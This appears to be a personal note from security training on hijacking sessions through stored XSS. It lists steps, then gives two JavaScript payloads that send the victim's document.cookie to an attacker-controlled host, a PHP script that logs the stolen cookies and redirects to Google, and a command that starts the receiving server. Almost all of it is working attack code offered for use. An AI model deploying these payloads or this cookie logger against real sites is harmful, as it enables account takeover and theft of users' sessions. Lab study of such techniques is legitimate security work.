## Session Hijacking - Landmine Vulnerability
I name it Mine Stepping because they are wondering in the application and step on a landmine

> [!NOTE] Steps-By-Steps
> 1. Must Identify where in the application is vulnerable to XSS, mostly work with Stored XSS. Reflected only works if the victim is dumb enough to use our link.
> 2. Have a payload, see below
> 3. Have a server running to receive the cookie
> 4. Wait for them to activate the XSS

Payloads:
```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```
```javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

Server:
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```
```shell-session
alakin2504@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
```

